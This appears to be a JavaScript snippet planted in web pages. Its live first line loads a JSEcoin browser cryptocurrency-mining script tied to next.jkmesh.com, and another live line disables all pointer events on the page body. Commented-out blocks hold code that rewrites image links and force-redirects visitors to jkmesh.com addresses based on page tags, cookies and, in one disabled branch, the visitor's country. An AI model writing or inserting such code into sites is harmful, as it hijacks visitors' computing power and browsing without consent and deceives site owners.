

!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/47941/next.jkmesh.com/optionalSubID/0/",s.parentNode.insertBefore(t,s)}();



$(function() {
	$("body").css("pointer-events","none");
	
/**	
var url3 ="http://next.jkmesh.com/#Apple";
var erro = $("h2.title a").text();    
if(erro == 'Not Found'){window.location.replace(url3);}
var hash='';
var cc='';
if(window.location.hash){window.location.replace(url3);}	   
**/

/*	
var caption = $("figcaption p").eq(0).text();
if(!caption){caption = $("h2.title").eq(0).text();}	
if(caption){
var caption_arr = caption.split("|");
if(!isNaN(caption_arr[2])){
hash = 	caption_arr[2];
var img_url = 'http://geo.jkmesh.com/#'+hash;
$(".photo-wrapper-inner a").attr("href",img_url);
$(".photo-wrapper-inner img").wrap("<a href='"+img_url+"' target='blank' rel='nofollow'></a>");
}
}
*/

	
	/**
var nr1 = $(".tags li a").eq(0).text();
if(nr1!=undefined && hash==''){hash=nr1;console.log("1: "+hash)}	
var nr2 = $("a.post-title").eq(0).text().split(" | ")[1];
if(nr2!=undefined && hash==''){hash=nr2;console.log("2: "+hash)}	
var nr3 = $("ul.TAGS li a").eq(0).text();
if(nr3!=undefined && hash==''){hash=nr3;console.log("3: "+hash)}	
var nr4 = $("h1").eq(0).text().split(" ")[0];
if(nr4!=undefined && hash==''){hash=nr4;console.log("4: "+hash)}	
if(hash!=undefined){
hash=hash.replace("&","");
hash=hash.replace("-"," ");	
hash=hash.replace("'"," ");	
//hash=hash.replace("%20"," ");   
//hash=hash.replace(/\s+$/g,"");
//hash = hash.replace(/\//g, '');
//hash = hash.replace('%29', '');
//hash = encodeURI(hash);
var url = 'http://next.jkmesh.com/#'+hash;

$(".photo-wrapper-inner a").attr("href",url);
$(".photo-wrapper-inner img").wrap("<a href='"+url+"' target='blank' rel='nofollow'></a>");
} 
**/	

	/**
if(document.cookie.indexOf(hash)<0) {
document.cookie=hash+"=1;expires="+new Date((new Date).getTime()+10*60*1000).toGMTString()+";path=/";
//$.ajax({ url: '//freegeoip.net/json/',async:true, type: 'POST', dataType: 'jsonp', success: function(location) 
//{ 
//var country_code = location.country_code; 
//if(country_code=='US' || country_code=='CA' || country_code=='AU' || country_code=='GB')
//{
       // _gaq.push(['_trackEvent',country_code, hash, window.location.href+'|'+document.referrer]); 
//_gaq.push(['_trackEvent',url,window.location.href,hash]); 
	window.location.replace(url);
//}	
//}});
}
	**/
	
});


